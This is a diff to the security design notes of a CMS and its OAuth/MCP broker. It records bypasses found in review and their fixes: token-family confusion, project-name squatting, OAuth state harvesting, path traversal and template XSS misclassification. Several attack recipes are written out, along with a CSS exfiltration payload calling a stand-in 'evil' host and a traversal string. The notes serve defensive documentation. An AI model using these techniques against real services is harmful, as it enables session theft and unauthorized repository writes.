@@ -2,7 +2,8 @@
 
 The auth/authz rules the tenant site and the broker both depend on, and why each
 exists. Written after the 2026-07-25 review, which found four ways to bypass the
-`/admin` gate — every rule below is here because something got through.
+`/admin` gate, and extended after the 2026-07-26 sweep, which found five more —
+every rule below is here because something got through.
 
 Companion docs: `keys-and-secrets.md` (every credential and who holds it),
 `onboarding-workflow.md` (life of an onboarding), `onboarding-broker-design.md`
@@ -11,7 +12,7 @@ where they disagree.**
 
 ---
 
-## 1. The four invariants
+## 1. The five invariants
 
 ### I1 — A valid signature is not authorization
 
@@ -101,6 +102,67 @@ A `sites` claim is a *grant*, not a hint: absent or empty means **nothing**, nev
 everything (`lanza-broker/functions/api/mcp.ts`). The consent POST is intersected with
 the server's own list, so the browser can only narrow it; refresh carries it unchanged.
 
+### I5 — One key signs two token families; a signature does not say which
+
+`HANDOFF_PRIVATE_KEY` signs **both** the 7-day CMS session (`/api/auth/callback`) and
+the 1-hour MCP access token (`/api/oauth/token`). They are not interchangeable — the
+session opens `/admin`, the GitHub proxy and the Cloudflare token — so every consumer
+must establish *which one it is holding*, not merely that the broker signed it.
+
+I4 alone does not do this, because **the MCP token's audience is chosen by the client
+requesting it**. `resource` arrives as a query parameter. Ask for the tenant's bare
+origin instead of its `/api/mcp` endpoint and the resulting token carries the same
+`login`, the same `aud` and the same signature as that site's session cookie — so it
+*is* that site's session cookie:
+
+> **Verified, now blocked.** Register a client (registration is open by design), send
+> the site owner an `/authorize` link with `resource=https://<their-site>`, and one
+> click returns a working `lanza_session` for their site to an attacker-chosen
+> `redirect_uri`. GitHub does not re-prompt a user who has already authorized the App
+> — which every tenant has, since that is how they log in.
+
+Three locks, because the fleet runs pinned versions and only the first protects a
+tenant that has not updated:
+
+1. **`authorize.ts` pins `resource` to an MCP endpoint** (`isMcpResource`, path must be
+   exactly `/api/mcp`). Both well-known documents advertise only that, so no legitimate
+   client is affected. This is the load-bearing fix — it is server-side and immediate.
+2. **Both families are labelled** — `typ: "session"` and `typ: "mcp"`.
+3. **Consumers check the label.** The tenant's `verifySession` takes a `family`
+   argument (`session` for `/admin`, `mcp` for `/api/mcp`); the broker's `/api/token`
+   pins each family to the audience *shape* it must have — a session names a bare
+   origin, an MCP token names `…/api/mcp`.
+
+A missing `typ` is accepted and a wrong one refused, so tokens minted before the claim
+existed keep working and nobody is signed out.
+
+**`/api/token` accepts both families on purpose.** The tenant's `/api/mcp` route mints
+its GitHub token by forwarding the agent's own access token here, so refusing the MCP
+family would break every agent write. The consequence is explicit and accepted: **an
+MCP access token can be redeemed at `/api/token` for a `Contents:write` installation
+token**, which is broader than the MCP tools' own path confinement (§3). What keeps
+that bounded is that the token is hard to obtain — hence the consent screen below — not
+that the confinement holds against its holder. Do not read `assertEntryPath` as a
+guarantee against a *stolen token*; it is a guard against a *steered agent*.
+
+**Registration is open, so consent cannot be skipped.** DCR needs no credentials and
+CIMD needs no registration at all, so "which client is this" can never be inferred —
+only shown and confirmed. Both MCP flows now render a consent screen before any code is
+minted, naming the client *and* its redirect target (a name can lie; the redirect
+origin is where the token actually goes). The single-site flow previously minted
+silently on the reasoning that "identity is the whole consent" — true of the
+user↔GitHub leg, but GitHub's screen names `lanza-cms`, never the requesting client.
+
+**The GitHub `state` is a KV key, not a secret.** Anyone may call `/authorize` and read
+it out of the 302. A second value is now set as an HttpOnly cookie
+(`lanza_oauth_bind`) and required at the callback, so the browser that finishes a flow
+must be the one that started it. Without it, an attacker harvests a `state`, lures the
+victim through GitHub carrying it, and the code minted for the **victim's** identity is
+bound to the **attacker's** client and PKCE challenge. PKCE does not help: it binds the
+code to the client, and there the attacker *is* the client. The two other OAuth entry
+points in the broker (`onboard/oauth/start.ts`, `auth/cf/login.ts`) always did this;
+the MCP authorization server was the one that did not.
+
 ---
 
 ## 2. How a tenant's Pages project is named
@@ -135,12 +197,27 @@ A 48-bit suffix bound to `owner/repo` satisfies both: collisions aren't a
 practical concern, nobody can squat another tenant's name, and every name stays
 derivable from public inputs.
 
-**The fallback ladder.** `projectNameCandidates` returns `[base, base-2, base-3,
-base-4]`. Only Cloudflare can say whether a name is genuinely free, so the create
-path must be able to try again; in practice the first candidate always wins.
-`allowedOriginsForRepo` accepts *every* candidate, which keeps the audience check
-correct no matter which one the create landed on — the set is small, fixed, and
-derived from that one repo, so it grants nothing to any other tenant.
+**The fallback ladder is for creating, never for authorizing.**
+`projectNameCandidates` returns `[base, base-2, base-3, base-4]`. Only Cloudflare can
+say whether a name is genuinely free, so `deploy.ts` must be able to try again; in
+practice the first candidate always wins.
+
+`allowedOriginsForRepo` used to accept *every* candidate, on the reasoning that the set
+is derived from one repo and so "grants nothing to any other tenant". That is true of
+tenants and false of everyone else — the set includes three names **no tenant holds**,
+in a namespace **anyone can register in**:
+
+> **Verified, now blocked.** `base` is a pure function of public inputs, so an attacker
+> computes a victim's `base-2`, creates a Pages project of that name in their *own*
+> Cloudflare account, serves a handoff endpoint there, and runs the login flow naming
+> that origin. `/api/auth/callback` signs `aud` for whatever origin the flow names, so
+> they receive a 7-day session that `audienceAllowedForRepo` then accepted **for the
+> victim's repo**. Squatting `base` itself also *forces* a later deploy onto `base-2`.
+
+It now returns **only the first candidate**. A tenant that genuinely landed on a
+fallback declares it in its own repo's `lanza.config.json` `domains` — the per-repo
+mechanism custom domains already use, read from the repo the caller has proved it owns,
+so it cannot widen anyone else's access.
 
 **Constraints to respect if you touch this:** Cloudflare Pages names are
 lowercase alphanumerics and hyphens, 58 chars max, start and end alphanumeric.
@@ -162,6 +239,21 @@ prompt-injected input. They are confined twice:
 `locale` is untrusted input, not a label: it is interpolated into a write path, so
 `resolveLocale()` requires it to be a locale the site declares in `data/site.json`.
 
+**`data/schema.json` is not a security boundary, and must not become one.**
+`create_content` does not call `assertEntryPath` — it *builds* its path from the
+collection's `folder` rather than checking one, so the only guard on it was
+`assertSafePath`'s structural test. A collection declaring `folder:
+"frontend/pages"` or `".github/workflows"` therefore turned "create an entry" into
+"write a file there", and that file is writable through `/admin/api/gh` and the CMS
+content-type editor. `getCollections()` now drops any collection whose folder is not
+under `content/`. Dropping rather than throwing is deliberate: a hostile entry makes
+that one collection invisible (every tool resolves by name and 404s) instead of
+disabling the whole site.
+
+> The forced `.md` suffix is what kept this from being worse — `.github/workflows/x.md`
+> is inert because Actions needs `.yml`. Do not rely on that; it is a coincidence of
+> the filename, not a confinement.
+
 Why both: without confinement, "update an entry" is whole-repo write. In range
 would be `lanza.config.json` (which decides who owns `/admin`),
 `.github/workflows/*` (arbitrary code in the tenant's CI, reachable by staging a
@@ -176,18 +268,28 @@ upsert. Two titles that slugify alike would otherwise destroy an entry silently.
 
 | Setting | Where | Why | Consequence if unset |
 |---|---|---|---|
-| `ALLOWED_TENANT_ORIGINS` | broker | I4 — lists custom tenant domains that can't be derived from a repo name | **A custom-domain tenant cannot save.** `/api/token` returns 403 because the derived origin doesn't match. Comma-separated full origins. |
+| `ALLOWED_TENANT_ORIGINS` | broker | I4 — lists custom tenant domains that can't be derived from a repo name | **A custom-domain tenant cannot save.** `/api/token` returns 403 because the derived origin doesn't match. Comma-separated; **scope each entry to its repo** as `owner/repo=https://origin`. |
 | `HANDOFF_PUBLIC_KEY` | broker | `/api/token` verifies tenant sessions with it | First save fails with a 500 that points at the tenant, not the broker |
 | `ADMIN_LOGIN` (optional) | tenant | Overrides `lanza.config.json`'s `adminLogin`; comma-list for extra editors | Falls back to the committed config — fine for a normal tenant |
 
 **lanzacms.com specifically** (the Lanza instance we run our own site on): its
 repo is `dsottimano/lanza`, so the derived origin is
 `https://lanza-76cae1b6cc54.pages.dev` — not the domain it actually serves from.
-The broker must carry `ALLOWED_TENANT_ORIGINS=https://lanzacms.com` or saves from
-that site break.
+The broker must carry an entry for it or saves from that site break.
 
-Any tenant on a custom domain needs the same entry. That is the one thing §2's
-derivation cannot cover, because a custom domain is not a function of the repo.
+**Scope the entry to its repo.** An unscoped `https://lanzacms.com` is applied when
+checking *every* repo, so any session for that origin satisfies the audience check for
+every repo its login owns — restoring exactly the state I4 exists to prevent. The
+bare form still parses, for compatibility; it should not be used.
+
+```
+ALLOWED_TENANT_ORIGINS=dsottimano/lanza=https://lanzacms.com
+```
+
+Any tenant on a custom domain needs the same entry — or, better, declares it in their
+own repo's `lanza.config.json` `domains`, which needs no broker configuration at all
+and cannot affect anyone else. That is the one thing §2's derivation cannot cover,
+because a custom domain is not a function of the repo.
 
 ---
 
@@ -196,6 +298,11 @@ derivation cannot cover, because a custom domain is not a function of the repo.
 Real, reviewed, not currently fixed. Listed so they are decisions rather than
 oversights.
 
+- **Refresh tokens are 30-day bearers with no reuse detection.** Rotation is
+  single-use (a replay 400s), but nothing invalidates the live chain when a replay is
+  seen, so a thief and the legitimate client race silently rather than the theft being
+  detected. Reduced from 90 days on 2026-07-26; binding to `client_id` shipped at the
+  same time, so a leaked token is at least useless to a different client.
 - **Sessions cannot be revoked.** The session is a stateless 7-day RS256 bearer
   with no `jti` and no server-side state. Logout clears the cookie only; a
   captured token stays valid for its full life, and removing a login from
@@ -207,11 +314,10 @@ oversights.
 - **The handoff token is the session token.** One artifact serves as both
   transport credential and session credential, so anything that observes the
   handoff once holds a 7-day session.
-- **Proxy responses relay upstream headers.** `new Headers(upstream.headers)`
-  copies GitHub's `Cache-Control: private, max-age=60` and `Access-Control-Allow-Origin: *`.
-  Not exploitable today (`SameSite=Lax`; `ACAO: *` is rejected with credentials),
-  but the "never cached" rule in CLAUDE.md Rule 2 is inherited rather than
-  enforced. Switching the session cookie to `SameSite=None` would make this live.
+- ~~**Proxy responses relay upstream headers.**~~ **Fixed 2026-07-26.**
+  `cache-control` and the `access-control-*` family are now stripped, and both proxies
+  set `Cache-Control: no-store` themselves. CLAUDE.md Rule 2's "never cached" is
+  enforced rather than inherited from whatever GitHub happened to send.
 - **A Cloudflare access token passes through the browser during onboarding.**
   `lanza_cf` holds it as unauthenticated base64 JSON (`HttpOnly; Secure; Path=/`,
   `Max-Age=3600`). Reduced 2026-07-25 and **accepted as-is**: the cookie no longer
@@ -235,9 +341,39 @@ oversights.
   and `workers-r2.write` were removed; no broker code path ever used them. The
   tenant CMS *does* provision KV/D1/R2, but on the tenant's own token via
   `functions/_lib/cf-proxy.ts`, never on this grant.
-- **`/api/auth/cf/login` honours an unauthenticated `?scope=` override.**
+- **A `<style>` ELEMENT with a placeholder is a CSS context the engine treats as
+  text.** `style="…"` attributes are refused outright, but `<style>.a{color:{{c}}}</style>`
+  only gets HTML escaping — enough to stop a `</style>` breakout (entities are literal
+  in a raw-text element, verified) but not to stop `background:url(https://evil/?leak)`
+  exfiltrating via an attribute selector. No shipped template has this shape. Fix if
+  templates ever legitimately need one.
+- **The public site has no full CSP and no `frame-ancestors`.** `public/_headers` sets
+  `nosniff`, `Referrer-Policy`, `object-src 'none'` and `base-uri 'none'` only. This is
+  a decision, not an oversight: a customer's public site may legitimately be embedded,
+  and a `script-src` would have to account for whatever a tenant's own theme loads.
+  Post bodies are sanitized (`frontend/lib/sanitize.ts`), which is the actual control.
+  `/admin` is the origin that matters and it has a real CSP — note `_headers` does NOT
+  apply to Pages Function responses, so the CMS policy lives in `_lib/admin-gate.ts`.
+- **`/api/auth/cf/login` honours an unauthenticated `?scope=` override.** Re-checked
+  2026-07-26: not an escalation. The extra scopes still face Cloudflare's own consent
+  screen, the token lands only in the HttpOnly `lanza_cf` cookie on the broker origin,
+  and no broker code path uses a scope beyond the four defaults. The real cost is
+  consent-phishing optics — a Lanza-branded consent for permissions Lanza never uses.
 - **No `Origin` validation on the MCP transport.** The spec asks for it against
   DNS rebinding; impact is low because auth is Bearer, not cookie.
+- **An MCP access token can be redeemed at `/api/token` for `Contents:write`** — see
+  I5. Deliberate: the tenant's MCP route mints its GitHub token by forwarding the
+  agent's own token, so this cannot be refused without breaking agent writes. It means
+  the MCP path confinement in §3 does not bind a token's *holder*, only a steered
+  agent. Note GitHub itself refuses `.github/workflows/*` writes to an App token
+  without the `workflows` permission, which the broker never requests — **verify this
+  holds before relying on it.**
+- **`auth/callback.ts` still signs `aud` for whatever origin the login flow names.**
+  Design §3.3 accepts this because the receiving tenant checks `adminLogin`. The
+  squatting attack in §2 showed the gap: the *attacker* can be the receiver. Closed at
+  the consumer (`allowedOriginsForRepo` no longer blesses unclaimed names) rather than
+  at the signer, so a forged origin now yields a session that is useless everywhere.
+  Restricting what the broker will sign remains owed.
 
 ---
 
@@ -245,7 +381,48 @@ oversights.
 
 - Adding a route under `/admin/`? It inherits the middleware — confirm it should.
 - Adding a GitHub call? Use an existing client. A third one means a third place
-  I3 can be forgotten.
+  I3 can be forgotten — and it was: `lanza-broker/functions/_lib/gh-app.ts` interpolated
+  a request-supplied `repo` into `api.github.com` paths with no validation, so
+  `x/../../victim/secret` resolved into another tenant's repo with the App JWT attached.
+  Names are now checked against GitHub's own grammar (`isValidOwner`/`isValidRepo`) at
+  the client *and* at `/api/token`.
+- Accepting a token? Say which **family** you expect (I5). `verifySession` defaults to
+  `session`; the MCP surfaces must ask for `mcp`. A signature is not an answer.
+- Adding an origin to an authorization decision? It must be one a tenant demonstrably
+  **holds**. Derived-but-unclaimed names are squattable (§2).
+- **`frontend/lib/template-render.ts` has a build-time backstop, and that is the
+  control you should actually rely on.** `frontend/lib/assert-rendered-safe.ts` parses
+  the RENDERED output with parse5 — the same tokenizer a browser uses — and fails the
+  build if a VALUE produced a live URL scheme, an `on*` handler, `srcdoc`, `<base
+  href>`, a meta refresh or script/style text. It renders twice (once with the real
+  data, once with every value replaced by an inert token) and reports only the
+  difference, so author markup like `<button onclick="doThing()">` is never flagged —
+  a false positive here would fail a tenant's deploy.
+  It exists because the engine's position classifier was wrong five times in five
+  review rounds, always the same way, and "we fixed the last one" is not evidence there
+  is no next one. **This check does not depend on the engine being correct**, which is
+  the whole point. Verified by reverting a real engine guard: the engine emitted live
+  `javascript:` and the build failed. Build-time only — the CMS preview imports the
+  engine in the browser, so parse5 must not enter that bundle (asserted).
+- Touching `frontend/lib/template-render.ts`? Its safety depends on knowing WHERE a
+  placeholder sits, and **every** bug it has had was a misclassification, not a bad
+  escape. Three separate attempts to answer "am I inside a tag?" by looking BACKWARDS
+  through preceding text were each bypassable, because a quoted attribute value may
+  legally contain `<` or `>`: `lastIndexOf("<") > lastIndexOf(">")` fell to `alt="a>b"`;
+  seeking to the last `<` fell to `alt="a<b>c"`; and a fixed-size window dropped the
+  opening `<` behind a long attribute and failed **open**. It is now a forward state
+  machine (`Ctx`) advanced one character at a time — do not replace it with a lookback.
+  It also has to skip what is NOT markup: a `"` or `'` inside a comment, `<script>`,
+  `<style>` or `<title>` used to open an attribute value that never closed, so the next
+  real `href` was swallowed and never checked (`<!-- don't -->` was enough). Comments
+  end at `-->`, not the first `>`; raw-text elements end at their close tag; a quote
+  opens a value only directly after `=`.
+  Other rules that are load-bearing rather than cosmetic: `/` separates attribute names
+  (`<a/href=` is an href to a browser), a `{{#if}}` body is not a literal prefix
+  (it renders to nothing when false), and `{{{raw}}}` is only "already-safe HTML" in a
+  markup position — hence `Position.inTag`. An unknown position must fail closed.
+  `functions/_lib/template-render.test.mjs` holds every payload; each test fails if its
+  guard is reverted.
 - Adding an MCP tool that takes a path or a path fragment? Route it through
   `assertEntryPath` (entries) or `assertSafePath` (anything else). Interpolating a
   tool argument into a path without one of those is the bug class that produced
@@ -253,6 +430,11 @@ oversights.
 - Changing `isAllowed`, `assertSafePath`, or the audience binding? The adversarial
   cases live in `functions/_lib/gh-proxy.test.mjs` and `mcp-core.test.mjs`. They
   assert refusal **and** that nothing was written — keep both halves.
+- Touching the OAuth authorization server? `lanza-broker/functions/api/oauth/
+  oauth-flow.test.mjs` now covers the I5 cases: a non-MCP `resource`, a harvested
+  `state` with no browser binding, a code redeemed by the wrong client, and the
+  consent screen minting nothing until Allow is pressed. `tenant-origin.test.mjs`
+  covers the squattable fallbacks and the repo-name grammar.
 - Touching the multi-site MCP grant (the `sites` claim, the consent screen, the
   router)? Its adversarial cases live in `lanza-broker/functions/api/
   mcp-multisite.test.mjs` — a tampered consent POST, a broadening refresh, a replayed
